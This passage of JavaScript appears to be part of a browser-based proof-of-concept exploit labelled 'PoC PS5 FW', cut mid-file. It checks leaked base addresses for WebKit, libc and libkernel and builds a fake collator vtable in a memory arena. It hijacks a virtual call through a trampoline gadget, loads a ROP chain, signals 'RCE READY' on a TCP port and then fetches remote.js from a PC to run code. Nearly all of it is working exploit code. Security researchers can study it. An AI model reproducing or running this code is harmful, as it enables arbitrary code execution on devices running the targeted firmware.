            + "-address-ok=" + s.gotWindowAddressesOK
            + "-read-twice=" + s.gotWindowsRepeated
            + "-canonical=" + s.gotCanonicalOK);
        mark("REQUIREMENTS-IMPORTS", "A=" + _ds.hex(s.requirementsObjectA)
            + "-B=" + _ds.hex(s.requirementsObjectB));
        mark("REQUIREMENTS-BASE", "" + _ds.hex(s.requirementsBase)
            + "-paired=true-pass=" + s.requirementsBaseOK);
        mark("LIBC-IMPORTS-1", "cxa_finalize=" + _ds.hex(s.cxaFinalizePointer)
            + ":" + _ds.importStatusName(s.cxaFinalizeStatus)
            + "-strlen=" + _ds.hex(s.strlenPointer) + ":" + _ds.importStatusName(s.strlenStatus));
        mark("LIBC-IMPORTS-2", "strerror=" + _ds.hex(s.strerrorPointer)
            + ":" + _ds.importStatusName(s.strerrorStatus)
            + "-memchr=" + _ds.hex(s.memchrPointer) + ":" + _ds.importStatusName(s.memchrStatus));
        mark("LIBC-BASE", "" + _ds.hex(s.libcBase) + "-equations=" + s.libcResolvedCount
            + "-pass=" + s.libcBaseOK);
        mark("KERNEL-IMPORTS-1", "object=" + _ds.hex(s.kernelObjectPointer)
            + "-close=" + _ds.hex(s.closePointer) + ":" + _ds.importStatusName(s.closeStatus)
            + "-error=" + _ds.hex(s.errorPointer) + ":" + _ds.importStatusName(s.errorStatus));
        mark("KERNEL-IMPORTS-2", "getpid=" + _ds.hex(s.getpidPointer)
            + ":" + _ds.importStatusName(s.getpidStatus)
            + "-pthread_getspecific=" + _ds.hex(s.pthreadGetspecificPointer)
            + ":" + _ds.importStatusName(s.pthreadGetspecificStatus));
        mark("KERNEL-BASE", "" + _ds.hex(s.kernelBase) + "-equations=" + s.kernelResolvedCount
            + "-object-anchor=" + s.kernelObjectBaseOK + "-pass=" + s.kernelBaseOK);
        mark("ARENA-CELL", "view=" + _ds.hex(s.arenaViewAddress)
            + "-backing=" + _ds.hex(s.arenaBacking)
            + "-size=" + _ds.hex(c.ARENA_BYTES)
            + "-header-pass=" + s.arenaViewHeaderOK
            + "-sentinel-pass=" + s.arenaBackingRepeated);
        mark("COLLATOR", "cell=" + _ds.hex(s.realCollatorAddress)
            + "-m_collator=" + _ds.hex(s.realCollatorAddress + 0x18)
            + "-original=" + _ds.hex(_ds.low48At(collatorHeader, 0x18))
            + "-compare=" + _ds.hex(s.compareFnAddress)
            + "-search-prewarmed=" + s.collatorHeaderOK);
        mark("NOTIFY-ARENA", "B=" + _ds.hex(s.fakeUCollatorAddress)
            + "-V=" + _ds.hex(s.fakeVtableAddress)
            + "-virtual-slot=" + _ds.hex(s.fakeVtableAddress + 0x128));
        mark("NOTIFY-TRAMPOLINE", "" + _ds.hex(s.naturalTrampolineAddress)
            + "-libkernel-rva=" + _ds.hex(c.NATURAL_TRAMPOLINE_OFFSET)
            + "-natural-rsp=true-bytes=488b8fe000000051488b4f60488b7f48c3");
        mark("NOTIFY-TARGET", "" + _ds.hex(s.notifyEntryAddress)
            + "-libkernel-rva=" + _ds.hex(c.NOTIFY_OFFSET)
            + "-address-ok=" + s.notifyAddressOK
            + "-offline-verified-fw=" + c.FW_LABEL + "-xotext-not-read=true");
        mark("NOTIFY-CONTEXT", "B+48-rdi=0-device"
            + "-B+60-rcx=0-nonblocking-B+e0=notification-export"
            + "-rsi=request-rdx=" + _ds.hex(c.NOTIFICATION_REQUEST_SIZE));
        mark("NOTIFY-REQUEST", "size=" + _ds.hex(c.NOTIFICATION_REQUEST_SIZE)
            + "-message-offset=" + _ds.hex(c.NOTIFICATION_MESSAGE_OFFSET)
            + "-ascii=true-layout-pass=" + s.notificationRequestOK
            + "-prewarm-result=" + s.notificationPrewarmResult);
        mark("NATIVE-EXECUTABLE-HEX", _ds.dumpHex(targetHeader, c.NATIVE_EXECUTABLE_BYTES));
        mark("IMPORT-WINDOW-A-HEX", _ds.dumpHex(importWindowA1, c.IMPORT_WINDOW_A_BYTES));
        mark("IMPORT-WINDOW-B-HEX", _ds.dumpHex(importWindowB1, c.IMPORT_WINDOW_B_BYTES));

        var leakPass = s.rwHeaderOK && s.holderHeaderOK && s.functionHeaderOK
            && s.nativeExecutableHeaderOK && s.webkitBaseOK
            && s.pointersRepeated && s.restoreObserved
            && s.gotReadOK && s.requirementsBaseOK && s.libcBaseOK && s.kernelBaseOK
            && s.arenaViewHeaderOK && s.arenaBackingRepeated
            && s.collatorHeaderOK && s.compareFnHeaderOK
            && s.getpidStatus === 1
            && s.notifyAddressOK
            && s.notificationRequestOK
            && s.notifyEntryAddress === s.kernelBase + c.NOTIFY_OFFSET
            && s.compositionLength === c.EXPECTED_LENGTH;
        try {
            sessionStorage.setItem(s.blockKey, "1");
            sessionStorage.setItem(s.passKey, "pending");
            s.commitBlockConfirmed = sessionStorage.getItem(s.blockKey) === "1"
                && sessionStorage.getItem(s.passKey) === "pending";
        } catch (e) {
            s.commitBlockConfirmed = false;
        }

        if (leakPass) {
            mark("MODULE-IMPORT-LEAK-PASS",
                "windows-read-twice=true-provider-crosschecks=true"
                + "-holder-targets-validated=true-notification-target-verified=true");
        } else {
            mark("MODULE-IMPORT-LEAK-MISMATCH", "rw=" + s.rwHeaderOK
                + "-function=" + s.functionHeaderOK
                + "-native=" + s.nativeExecutableHeaderOK
                + "-base=" + s.webkitBaseOK
                + "-repeat=" + s.pointersRepeated + "-got=" + s.gotReadOK
                + "-requirements=" + s.requirementsBaseOK
                + "-libc=" + s.libcBaseOK + "-kernel=" + s.kernelBaseOK
                + "-restore=" + s.restoreObserved);
        }

        mark("ROOTS-LIVE", "rw-mirror=" + s.rwMirror[0].toString(16)
            + "-guard-byte=" + s.targetView[0].toString(16)
            + "-parseInt-type=" + typeof s.nativeTarget
            + "-length-word=" + s.lengthWord.keep.toString(16));
        if (leakPass && s.notifyReady && s.carrierArmedForCommit
            && s.commitBlockConfirmed) {
            mark("RCE-PLAN-PASS", "arena-filled=" + s.arenaFilledOK
                + "-rop-chain-loaded=true");
            mark("RCE-READY",
                "tcp-port-" + c.RCE_PORT + "-via-rop-chain-waiting-for-payload");
            _ds.catState("ok");
            _ds.setCaption("PoC PS5 FW " + c.FW_LABEL + " - RCE READY");
            if (c.PROBE_MODE) {
                _ds.showStatus("PROBE OK \u2014 offsets verified (no commit)", "ok");
                if (typeof _ds.runProbeReport === "function") setTimeout(_ds.runProbeReport, 200);
                return;
            }
            _ds.showStatus("RCE ready \u2014 loading remote.js from PC", "ok");
            if (typeof _ds.loadAndCommitRce === "function") setTimeout(_ds.loadAndCommitRce, 500);
            return;
        }

        mark("NOTIFY-PLAN-MISMATCH", "ready=" + s.notifyReady
            + "-arena=" + s.arenaLayoutOK + "-filled=" + s.arenaFilledOK
            + "-collator=" + s.collatorHeaderOK
            + "-compare=" + s.compareFnHeaderOK
            + "-request=" + s.notificationRequestOK
            + "-target=" + s.notifyAddressOK
            + "-carrier-armed=" + s.carrierArmedForCommit
            + "-repeat-block=" + s.commitBlockConfirmed);
        _ds.failed();
        setTimeout(function () { mark("SURVIVED-NO-COMMIT-T1000"); }, 1000);
    }

    // ── Natural trampoline notification ──────────────────────────────────────

    function sendNotifNatural(text) {
        if (!s.notifyReady || !s.arenaView || !s.rwView || s.commitStarted)
            return false;

        var maxLen = c.NOTIFICATION_REQUEST_SIZE - c.NOTIFICATION_MESSAGE_OFFSET - 1;
        var safeText = (text || "RCE READY").slice(0, maxLen);
        var trailing = c.NOTIFICATION_REQUEST_SIZE - c.NOTIFICATION_MESSAGE_OFFSET - safeText.length;
        var savedReq = s.notificationRequest;
        s.notificationRequest = "\x00".repeat(c.NOTIFICATION_MESSAGE_OFFSET)
            + safeText + "\x00".repeat(trailing);

        _ds.putLow48(s.arenaView, c.FAKE_VTABLE_OFFSET + 0x128, s.naturalTrampolineAddress);
        _ds.putLow48(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0xe0, s.notifyEntryAddress);

        var fakeHigh = Math.floor(s.fakeUCollatorAddress / 0x100000000);
        scratchWords[0] = s.fakeUCollatorAddress - fakeHigh * 0x100000000;
        scratchWords[1] = fakeHigh;
        for (var i = 0; i < 8; ++i) s.rwView[i] = scratchBytes[i];

        try { s.compareFn(s.notificationRequest, "b"); } catch (e) { }

        for (var j = 0; j < collatorOriginal.length; ++j)
            s.rwView[j] = collatorOriginal[j];

        var rcePivotAddress = s.kernelBase + c.RCE_PIVOT_TRAMPOLINE_RVA;
        _ds.putLow48(s.arenaView, c.FAKE_VTABLE_OFFSET + 0x128, rcePivotAddress);

        var retGadget = s.kernelBase + 0xc7;
        _ds.putLow48(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0xe0, retGadget);

        s.notificationRequest = savedReq;
        mark("NOTIF-SENT", safeText.slice(0, 40));
        return true;
    }

    // ── Export to namespace ──────────────────────────────────────────────────
    _ds.scanWindowFor = scanWindowFor;
    _ds.readTrampolineBytes = readTrampolineBytes;
    _ds.scanKernelStubs = scanKernelStubs;
    _ds.scanAndVerifyOffsets = scanAndVerifyOffsets;
    _ds.loadHistoryCritical = loadHistoryCritical;
    _ds.reportComposition = reportComposition;
    _ds.sendNotifNatural = sendNotifNatural;
    _ds.composition = true;
})();
